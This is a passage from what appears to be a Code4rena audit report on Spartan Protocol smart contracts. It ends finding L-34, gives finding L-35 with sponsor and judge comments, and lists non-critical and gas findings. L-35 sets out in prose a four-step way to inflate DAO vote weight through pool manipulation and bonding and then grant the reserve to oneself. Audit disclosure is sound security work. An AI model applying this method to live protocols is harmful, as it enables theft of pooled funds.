mind.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-889636297\">SamusElderg (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>To be clear; this is non-critical based on the warden’s outlined scenario. Front-running a user’s txn would mean sync() is called before the user’s funds are sent in, so sync() would have no effect on a txn that hasn’t happened yet. Unpermissioned sync() Might however have low risk or otherwise in other scenarios but cant simulate or think of any. Regardless we will permission sync() to close any vector that has not been thought of there.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-894862095\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per sponsor comment, I align with low risk</p>\n</blockquote>\n<h2 id=\"l-35-vote-weight-can-be-manipulated\" style=\"position:relative;\"><a href=\"#l-35-vote-weight-can-be-manipulated\" aria-label=\"l 35 vote weight can be manipulated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/176\">[L-35] Vote weight can be manipulated</a></h2>\n<p>The vote weight is determined by the <code>DAOVault</code> and <code>BondVault</code> weight (<code>voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)</code>).\nThe weight in these vaults is the deposited LP token.\nThe <code>BondVault</code> however pays for the <code>BASE</code> part itself (see <code>DAO.handleTransferIn</code>), therefore one only needs to deposit <code>tokens</code> and the <code>DAO</code> matches the <strong>swap value</strong>.</p>\n<p>Therefore, it’s possible to manipulate the pool, deposit only a small amount of <code>tokens</code> (receiving a large amount of matching <code>BASE</code> by the DAO) and receive a large amount of LP tokens this way.\nattack can be profitable:</p>\n<ol>\n<li>Manipulate the pool spot price by dripping a lot of <code>BASE</code> into it repeatedly (sending lots of smaller trades is less costly due to the <a href=\"https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools\">path-independence of the continuous liquidity model</a>). This increases the <code>BASE</code> per <code>token</code> price.</li>\n<li>Repeatedly call <code>DAO.bond(amount)</code> to drip <code>tokens</code> into the <code>DAO</code> and get matched with <code>BASE</code> tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the LP minting is relative to the manipulated low <code>token</code> reserve, a lot of LP units are minted for a low amount of <code>tokens</code>, leading to receiving large weight.</li>\n<li>Create a proposal to send the entire reserve balance to yourself by using <code>grantFunds</code></li>\n<li>Unmanipulate the pool by sending back the <code>tokens</code> from 1. This might incur a loss.</li>\n</ol>\n<p>The cost of the attack is the swap fees from the manipulation of 1. and 4. plus the (small due to manipulation) amount of tokens required to send in 2.\nThe profit can be the entire reserve amount which is unrelated to the pools (plus reclaiming lots of LP units over the span of the <code>BondVault</code> era).\nThe attack can be profitable under certain circumstances of:</p>\n<ul>\n<li>high reserves</li>\n<li>low liquidity in the pool</li>\n</ul>\n<p>I don’t think the attack would be feasible if we couldn’t get the <code>DAO</code> to commit the lion’s share of the <code>BASE</code> required to acquire LP units through the <code>BondVault</code> incentives.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/176#issuecomment-884649620\">verifyfirst (Spartan) disputed and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Warden must understand the bond program is extremely limited in time and amount of sparta allocated through the DAO.\nIf the attacker was able to obtain the entire bond allocation and weight is in sparta terms, the opportunity to attack would scale along with the pool depth and therefor total weight scales up along with the bond.\nGrant funds will be capped at a % of the reserve.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/176#issuecomment-894863957\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per sponsor comment, making this low risk</p>\n</blockquote>\n<h1 id=\"non-critical-findings\" style=\"position:relative;\"><a href=\"#non-critical-findings\" aria-label=\"non critical findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Non-Critical findings</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/215\">[N-01] Lack of emission of event when changing  dao fees</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/10\">[N-02] (out of scope) mintFromDAO of Sparta.sol can go over max supply</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/35\">[N-03] Router.sol: Better changeArrayFeeSize implementation</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/47\">[N-04] Synth.sol: Redundant _handleTransferIn, onlyDAO, DEPLOYER</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/50\">[N-05] Router.sol: lastMonth variable is private</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/52\">[N-06] Dao.sol: Return votes > consensus</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/53\">[N-07] DaoVault.sol &#x26; BondVault.sol: Discrepancies in mapping visibility</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/54\">[N-08] isEqual(): Inconsistent Implementation</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/55\">[N-09] Pool.sol + Synth.sol: Inconsistent Allowance Checking Implementation</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/61\">[N-10] Dao.sol: newParamProposal takes in uint32 param</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/62\">[N-11] Utils.sol: Calculation issue with Slippage Adjustment</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/69\">[N-12] Dao.sol: Unused hasMinority()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/19\">[N-13] Contract file name does not follow coding conventions</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/31\">[N-14] Misleading comment and missing revert message</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/41\">[N-15] Ambiguous parameter name in <code>SynthVault</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/75\">[N-16] Inconsistency in Function Naming</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/100\">[N-17] Max approvals are risky</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/122\">[N-18] isMember and arrayMembers are only added to but never removed from</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/125\">[N-19] Duplicated functionality in two functions is a maintainability risk</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/126\">[N-20] receive() function in Router allows locking of accidentally sent user’s BNB</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/128\">[N-21] Unused _token potentially indicates missing logic or is dead code</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/131\">[N-22] Lack of require() allows control flow to proceed leading to undefined behavior</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/132\">[N-23] Potential reentrancy may lead to unexpected behavior</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/203\">[N-24] Pool.burnSynth(address,address) is potentially reentrant</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/195\">[N-25] Dao.bond(address,uint256) is reentrant and payable</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/136\">[N-26] Missing check for token type/decimals in createPool</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/221\">[N-27] Missing synthReward</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/90\">[N-28] Critical protocol parameter changes should emit events</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/94\">[N-29] Missing event emit for MemberWithdraws</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/156\">[N-30] DAO approval amount too high for BASE</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/157\">[N-31] DAO approval amount too high for token</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/158\">[N-32] Pool: Can accidentally burn tokens by sending them to zero</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/159\">[N-33] Synth: Can accidentally burn tokens by sending them to zero</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/173\">[N-34] DAO.setGenesisFactors sets wrong <code>erasToEarn</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/175\">[N-35] BondVault fails if no SPARTA in DAO</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/91\">[N-36] Critical protocol parameter changes should have sanity/threshold checks</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/101\">[N-37] Deflationary assets are not handled uniformly across the protocol</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/107\">[N-38] Old DAO continues to exist/function even after moving to a new DAO</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/117\">[N-39] Missing zero-address check on recipient address in transfer</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/194\">[N-40] Router.revenueDetails(uint256,address) potentially vulnerable to miner manipulation</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/198\">[N-41] DaoVault.constructor(address) is missing a zero address check</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/201\">[N-42] Pool._addPoolMetrics(uint256) is subject to potential miner manipulation</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/143\">[N-43] Strict equality used in claimForMemeber()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/33\">[N-44] <code>approveAndCall</code> approve <code>max</code> amount of token</a></li>\n</ul>\n<h1 id=\"gas-optimization-25\" style=\"position:relative;\"><a href=\"#gas-optimization-25\" aria-label=\"gas optimization 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimization (25)</h1>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/51\">[G-01] BondVault.sol: Optimizations</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/95\">[G-02] Type mismatch between parameters of setGenesisFactors() and state variables</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/84\">[G-03] <code>POOLFACTORY.curatedPoolCount()</code> Gas Optimization</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/217\">[G-04] state variables that can be declared as immutable</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/219\">[G-05] state variable that can be declared as constant</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/24\">[G-06]\t<code>claimAllForMember</code> could be optimized</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/4\">[G-07] more efficient calls to DAO functions</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/36\">[G-08] Router.sol: Optimize calculation of totalTradeFees in addTradeFee()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/48\">[G-09] Dao.sol: Restrict Function Visibilities</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/49\">[G-10] Pool.sol: Optimizations</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/56\">[G-11] Pool.sol + Router.sol: Set revenue directly as _fee</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/57\">[G-12] Router.sol: Redundant _token initialization in addLiquiditySingleForMember()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/60\">[G-13] Dao.sol: Define BASE as iBEP20 instead of address</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/63\">[G-14] Utils.sol: Redundant two assignment in calcLiquidityUnitsAsym()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/73\">[G-15] Variables that can be  converted into immutable</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/74\">[G-16] Use unchecked blocks in some cases to save gas.</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/145\">[G-17] Function purgeDeployer() should be declared external in BondVault.sol</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/146\">[G-18] Variable one in Utils.sol can be set to constant  </a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/64\">[G-19] Remove _token from addLiquiditySingleForMember</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/80\">[G-20] ROUTER.addFee() Gas Optimization</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/81\">[G-21] POOL.addFee() Gas Optimization</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/82\">[G-22] SYNTHVAULT.harvestAll() Gas Optimization</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/83\">[G-23] SYNTHVAULT.addFee() Gas Optimization</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/86\">[G-24] ROUTER.addTradeFee()</a></li>\n<li><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/87\">[G-25] ROUTER._handleTransferIn()</a></li>\n</ul>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-13\">High Risk Findings (13)</a></p>\n<ul>\n<li><a href=\"#h-01-synthvault-withdraw-forfeits-rewards\">[H-01] <code>SynthVault</code> withdraw forfeits rewards</a></li>\n<li><a href=\"#h-02-poolsol--synthsol-failing-max-value-allowance\">[H-02] <code>Pool.sol</code> &#x26; <code>Synth.sol</code>: Failing Max Value Allowance</a></li>\n<li><a href=\"#h-03-result-of-transfer--transferfrom-not-checked\">[H-03] Result of <code>transfer</code> / <code>transferFrom</code> not checked</a></li>\n<li><a href=\"#h-04-members-lose-sparta-tokens-in-removeliquiditysingle\">[H-04] Members lose SPARTA tokens in <code>removeLiquiditySingle()</code></a></li>\n<li><a href=\"#h-05-synth-realise-is-vulnerable-to-flash-loan-attacks\">[H-05] Synth <code>realise</code> is vulnerable to flash loan attacks</a></li>\n<li><a href=\"#h-06-synthvault-rewards-can-be-gamed\">[H-06] <code>SynthVault</code> rewards can be gamed</a></li>\n<li><a href=\"#h-07-missing-slippage-checks\">[H-07] Missing slippage checks</a></li>\n<li><a href=\"#h-08-dividend-reward-can-be-gamed\">[H-08] Dividend reward can be gamed</a></li>\n<li><a href=\"#h-09-arbitrary-synth-mintburn-from-pool\">[H-09] arbitrary synth mint/burn from pool</a></li>\n<li><a href=\"#h-10-hijack-token-pool-by-burning-liquidity-token\">[H-10] Hijack token pool by burning liquidity token</a></li>\n<li><a href=\"#h-11-misuse-of-amm-model-on-minting-synth-resubmit-to-add-more-detail\">[H-11] Misuse of AMM model on minting <code>Synth</code> (resubmit to add more detail)</a></li>\n<li><a href=\"#h-12-wrong-calcliquidityholdings-that-leads-to-dead-fund-in-the-pool\">[H-12] wrong <code>calcLiquidityHoldings</code> that leads to dead fund in the Pool</a></li>\n<li><a href=\"#h-13-flash-loan-manipulation-on-getpoolshareweight-of-utils\">[H-13] Flash loan manipulation on <code>getPoolShareWeight</code> of <code>Utils</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-14\">Medium Risk Findings (14)</a></p>\n<ul>\n<li><a href=\"#m-01-daosol-insufficient-validation-for-proposal-creation\">[M-01] <code>Dao.sol</code>: Insufficient validation for proposal creation</a></li>\n<li><a href=\"#m-02-missleading-onlydao-modifiers\">[M-02] Missleading <code>onlyDAO</code> modifiers</a></li>\n<li><a href=\"#m-03-improper-access-control-of-claimallformember-allows-anyone-to-reduce-the-weight-of-a-member\">[M-03] Improper access control of <code>claimAllForMember</code> allows anyone to reduce the weight of a member</a></li>\n<li><a href=\"#m-04-_deposit-resetting-user-rewards-can-be-used-to-grief-them-and-make-them-loose-rewards-via-depositformember\">[M-04] _deposit resetting user rewards can be used to grief them and make them loose rewards via <code>depositForMember</code></a></li>\n<li><a href=\"#m-05-pools-can-be-created-without-initial-liquidity\">[M-05] Pools can be created without initial liquidity</a></li>\n<li><a href=\"#m-06-pool-approveandcall-sets-unnecessary-approval\">[M-06] Pool: <code>approveAndCall</code> sets unnecessary approval</a></li>\n<li><a href=\"#m-07-synth-approveandcall-sets-unnecessary-approval\">[M-07] Synth: <code>approveAndCall</code> sets unnecessary approval</a></li>\n<li><a href=\"#m-08-synthvault-deposit-lockup-bypass\">[M-08] <code>SynthVault</code> deposit lockup bypass</a></li>\n<li><a href=\"#m-09-in-the-beginning-its-relatively-easy-to-gain-majority-share\">[M-09] In the beginning its relatively easy to gain majority share</a></li>\n<li><a href=\"#m-10-grantfunds-will-revert-after-a-dao-upgrade\">[M-10] <code>grantFunds</code> will revert after a DAO upgrade.</a></li>\n<li><a href=\"#m-11-block-usage-of-addcuratedpool-\">[M-11] Block usage of <code>addCuratedPool</code> </a></li>\n<li><a href=\"#m-12-bondvaultsol-possibly-unwithdrawable-bondedlp-funds-in-claimformember--claimrate-never-zeros-after-full-withdrawals\">[M-12] <code>BondVault.sol</code>: Possibly unwithdrawable bondedLP funds in <code>claimForMember()</code> + <code>claimRate</code> never zeros after full withdrawals</a></li>\n<li><a href=\"#m-13-vulnerable-pool-initial-rate\">[M-13] Vulnerable Pool initial rate.</a></li>\n<li><a href=\"#m-14-bondvault-base-incentive-can-be-gamed\">[M-14] BondVault <code>BASE</code> incentive can be gamed</a></li>\n<li><a href=\"#m-15-deployer-can-drain-daovault-funds--manipulate-proposal-results\">[M-15] <code>DEPLOYER</code> can drain DAOVault funds + manipulate proposal results</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-35\">Low Risk (35)</a></p>\n<ul>\n<li><a href=\"#l-01-event-log-poisoning-by-griefing-attackers\">[L-01] Event log poisoning by griefing attackers</a></li>\n<li><a href=\"#l-02-attackers-can-grief-voting-by-removing-votes-just-before-finalization\">[L-02] Attackers can grief voting by removing votes just before finalization</a></li>\n<li><a href=\"#l-03-poolsol-swapto-should-not-be-payable\">[L-03] Pool.sol: <code>swapTo()</code> should not be payable</a></li>\n<li><a href=\"#l-04-incorrect-event-parameter-used-in-emit\">[L-04] Incorrect event parameter used in emit</a></li>\n<li><a href=\"#l-05-missing-check-for-topool--frompool\">[L-05] Missing check for <code>toPool != fromPool</code></a></li>\n<li><a href=\"#l-06-unnecessary-redundant-check-for-basispoints\">[L-06] Unnecessary redundant check for <code>basisPoints</code></a></li>\n<li><a href=\"#l-07-missing-islistedpool-checks-may-lead-to-lockloss-of-user-funds\">[L-07] Missing <code>isListedPool</code> checks may lead to lock/loss of user funds</a></li>\n<li><a href=\"#l-08-number-of-curated-pools-can-only-be-10-at-any-point\">[L-08] Number of curated pools can only be 10 at any point</a></li>\n<li><a href=\"#l-09-incorrect-event-parameter-logs-zero-address-instead-of-wbnb\">[L-09] Incorrect event parameter logs zero address instead of WBNB</a></li>\n<li><a href=\"#l-10-missing-check-for-already-curated-pool-being-re-curated\">[L-10] Missing check for already curated pool being re-curated</a></li>\n<li><a href=\"#l-11-inconsistent-value-of-burnsynth-between-pool-and-synth\">[L-11] Inconsistent value of <code>burnSynth</code> between Pool and Synth</a></li>\n<li><a href=\"#l-13-missing-zero-address-checks-in-constructors-and-setters\">[L-13] Missing zero-address checks in constructors and setters</a></li>\n<li><a href=\"#l-14-mismatch-in-event-definition\">[L-14] Mismatch in event definition</a></li>\n<li><a href=\"#l-15-missing-revert-if-denominator--0\">[L-15] Missing revert if denominator = 0</a></li>\n<li><a href=\"#l-16-missing-input-validation-zapliquidity\">[L-16] Missing input validation <code>zapLiquidity()</code></a></li>\n<li><a href=\"#l-17-loss-of-precision\">[L-17] Loss of precision</a></li>\n<li><a href=\"#l-18-missing-input-validation-in-addliquidityformember\">[L-18] Missing input validation in <code>addLiquidityForMember()</code></a></li>\n<li><a href=\"#l-19-daosol-unbounded-iterations-in-claimallformember\">[L-19] Dao.sol: Unbounded Iterations in <code>claimAllForMember()</code></a></li>\n<li><a href=\"#l-20-missing-parameter-validation\">[L-20] Missing parameter validation</a></li>\n<li><a href=\"#l-21-can-accidentally-lose-tokens-when-removing-liquidity-from-pool-2\">[L-21] Can accidentally lose tokens when removing liquidity from pool 2</a></li>\n<li><a href=\"#l-22memberwithdraws-event-not-fired\">[L-22]<code>MemberWithdraws</code> event not fired</a></li>\n<li><a href=\"#l-23-calcasymmetricvaluetoken-never-used\">[L-23] <code>calcAsymmetricValueToken</code> never used</a></li>\n<li><a href=\"#l-24-membercount-not-accurate\">[L-24] <code>memberCount</code> not accurate</a></li>\n<li><a href=\"#l-25-check-if-pool-exists-in-getpool-\">[L-25] check if pool exists in <code>getPool</code> </a></li>\n<li><a href=\"#-l-26approval-event-not-emitted-if-the-allowance-is-the-maximum\">[ L-26]\t<code>Approval</code> event not emitted if the allowance is the maximum</a></li>\n<li><a href=\"#l-27-utilssol-combine-swap-output--fee-calculation-to-avoid-rounding-errors--integer-overflow-updated\">[L-27] Utils.sol: Combine Swap Output + Fee Calculation to avoid Rounding Errors + Integer Overflow [Updated]</a></li>\n<li><a href=\"#l-28-daosol-reserve-emissions-must-be-turned-on-for-depositlps-and-bonds\">[L-28] Dao.sol: Reserve emissions must be turned on for <code>depositLPs</code> and bonds</a></li>\n<li><a href=\"#l-29-missing-zero-address-check-on-bondvault-constructor\">[L-29] Missing zero address check on <code>BondVault</code> constructor</a></li>\n<li><a href=\"#l-30-cant-add-bnb-with-createpooladd\">[L-30] Can’t add BNB with <code>createPoolADD</code></a></li>\n<li><a href=\"#l-31-possible-divide-by-zero-errors-in-utils\">[L-31] Possible divide by zero errors in <code>Utils</code></a></li>\n<li><a href=\"#l-32-purging-dao-deployer-immediately-in-a-single-step-is-risky\">[L-32] Purging DAO deployer immediately in a single-step is risky</a></li>\n<li><a href=\"#l-33-calling-synthvault_deposit-multiple-times-will-make-you-loose-rewards\">[L-33] Calling <code>synthVault</code>:_deposit multiple times, will make you loose rewards</a></li>\n<li><a href=\"#l-34-attacker-can-trigger-pool-sync-leading-to-user-fund-loss\">[L-34] Attacker can trigger pool sync leading to user fund loss</a></li>\n<li><a href=\"#l-35-vote-weight-can-be-manipulated\">[L-35] Vote weight can be 